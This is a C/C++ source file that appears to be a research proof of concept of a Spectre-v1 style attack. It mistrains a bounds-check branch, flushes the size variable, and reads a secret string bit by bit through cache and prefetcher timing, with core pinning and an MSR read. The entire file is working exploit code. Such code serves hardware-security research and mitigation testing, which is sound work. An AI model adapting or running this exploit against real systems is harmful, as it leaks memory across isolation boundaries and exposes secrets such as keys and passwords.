#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>

#include <time.h>
#include <unistd.h>

#define ATTACK_SAME_ROUNDS  10
#define TRAIN_TIMES         6
#define ROUNDS              1
#include "utils.hh"
// #include <string>
#include <random>
// #include <memory>
// #include <fstream>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif /* ifdef _MSC_VER */

/* Automatically detect if SSE2 is not available when SSE is advertized */
#ifdef _MSC_VER
/* MSC */
#if _M_IX86_FP==1
#define NOSSE2
#endif
#else
/* Not MSC */
#if defined(__SSE__) && !defined(__SSE2__)
#define NOSSE2
#endif
#endif /* ifdef _MSC_VER */

#ifdef NOSSE2
#define NORDTSCP
#define NOMFENCE
#define NOCLFLUSH
#endif

#include <sys/time.h>

#define CPU_ID 49
#define MAX(X,Y) (((X) > (Y)) ? (X) : (Y))
#define MIN(X,Y) (((X) < (Y)) ? (X) : (Y))

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
// uint8_t array1[160] = {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1};
uint8_t unused2[64];
uint8_t array2[256 * 64];
int results[256];
char * secret = "*secREt~";
// char * secret = "s";

int cache_hit_threshold = 140;
int MissLatency = 0;
int HitLatency = 0;

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

struct timespec const t_req{ .tv_sec = 0, .tv_nsec = 1000 /* 1µs */ };//秒0，纳秒1us
struct timespec t_rem;


// #define INTEL_MSR_MISC_FEATURE_CONTROL (0x1A4)
/**
 * Enum to keep the bit masks to select the prefetcher we want to control
 * via MSR_MISC_FEATURE_CONTROL register on Intel CPUs.
 */
// enum intel_prefetcher_t {
// 	INTEL_L2_HW_PREFETCHER          = 0b0001ULL,
// 	INTEL_L2_ADJACENT_CL_PREFETCHER = 0b0010ULL,
// 	INTEL_DCU_PREFETCHER            = 0b0100ULL,
// 	INTEL_DCU_IP_PREFETCHER         = 0b1000ULL,
// };

void prepare(int cpu){
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(CPU_ID, &mask);  // 设置为只在核心1上运行

  if (sched_setaffinity(0, sizeof(mask), &mask) == -1) {//0 is pid, self
    printf("sched_setaffinity");
    return;
  }else{
    printf("Pin at Core %d.\n", CPU_ID);
  }
  uint32_t msr_reg = INTEL_MSR_MISC_FEATURE_CONTROL;
  uint64_t msr_value = rdmsr(CPU_ID, msr_reg);
  printf("Reading msr_value 0x%lx.\n", msr_value);
//   msr_value = rdmsr(CPU_ID, msr_reg);
//   printf("Now msr_value 0x%lx.\n", msr_value);

}

__attribute__((always_inline)) static inline uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

__attribute__((always_inline)) static inline void mfence() { 
  asm volatile("mfence"); 
}

void maccess(void* p)
{
  asm volatile ("movq (%0), %%rax\n"
    :
    : "c" (p)
    : "rax");
}


__attribute__((always_inline)) size_t accessLatency(uint8_t* p)
{
  size_t time = rdtsc();
  asm volatile ("movq (%0), %%rax\n"
    :
    : "c" (p)
    : "rax");
  size_t delta = rdtsc() - time;
  return delta;
}

void victim_function(size_t x,  uint8_t shift) {
    uint8_t dummy = 2;
    if(x < array1_size){
        if((array1[x] >> shift) & 0x1){ //1-训练  0-不训练
          maccess(array2); // 不会触发预取
        }  
    }
    dummy = rdtsc();
}

void randomAccess(){
  for(int i=0; i < 10; i++){
    int ran_v = random() % 256;
    maccess(array2 + ran_v * 64);
  }
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x) {
 
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  

  for (i = 0; i < 256; i++)
    results[i] = 0;
    // int bit = 7;
    for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS*2; ++atkRound) {
      // printf("Round %d\n",atkRound);
       for(int bit = 7; bit >= 0; bit--){
         randomAccess();
         for (i = 0; i < 256; i++) _mm_clflush( & array2[i * 64]); /* intrinsic for clflush instruction */
          training_x = atkRound % array1_size;
          for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
              // training_x = atkRound % array1_size;
              /* Delay (can also mfence) */
              // for (volatile int z = 0; z < 100; z++) {}

              x = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; 
              x = (x | (x >> 16)); 
              x = training_x ^ (x & (malicious_x ^ training_x));
              if(j == 0){//attack round
                maccess(array2 + 64); //33d68  1*64
                maccess(array2 + 192);//33de8 3*64
                maccess(array2 + 320);// 5*64
              }
              for (volatile int z = 0; z < 100; z++) {}
              _mm_clflush( & array1_size);
              victim_function(x,bit);
        }

        maccess(array2 + 448);// 5*64
        nanosleep(&t_req, &t_rem);
        // accessLatency(array2 + 64), accessLatency(array2 + 448),
        if(atkRound<ATTACK_SAME_ROUNDS){continue;}//预热
        // latency =;
        addr = &array2[9 * 64];
        time1 = __rdtscp( & junk); /* READ TIMER */
        junk = * addr; /* MEMORY ACCESS TO TIME */
        // maccess(*addr);
        time2 = __rdtscp( & junk) - time1; 
        // res[0] += time2;  
        // results[bit] += accessLatency(array2 + 576);
        results[bit] += time2;
        // results[bit] += MIN(1000,  accessLatency(array2 + 576));
        // printf("Latency %d (%s)\tpos = %d\n",latency, latency > cache_hit_threshold ? "Long":"Short",bit) ;
        // printf("Latency %d (%s)\tsecret bit %d\tpos = %d\n",latency, latency > 350 ? "Long":"Short",('s'>>bit)&0x1 ,bit) ;
    }
  }
}


int main(){
    prepare(CPU_ID);
    size_t malicious_x = (size_t)(secret - (char * ) array1);
    MissLatency =  accessLatency(array2);//11*64
    printf("Miss = %d\t", MissLatency);

    int i;
    for (i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    }
    nanosleep(&t_req, &t_rem);
    HitLatency =  accessLatency(array2);//11*64
    printf("Hit = %d\n", HitLatency);
    cache_hit_threshold = (MissLatency + HitLatency)/2;
    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

    printf("Running at Intel(R) Xeon(R) Gold 6248R CPU.\nThe secret is '*secREt~'\n");
     /* Default addresses to read is 40 (which is the length of the secret string) */
    int len = 8;
    for(int pos = 0; pos < len; pos++){
      printf("Infering '%c'\n", secret[pos]);
      readMemoryByte(malicious_x++);
      for(int bit=7;bit>=0;bit--){
        printf("%d\n",results[bit]/ATTACK_SAME_ROUNDS);
      }
    }


    return 0;
}
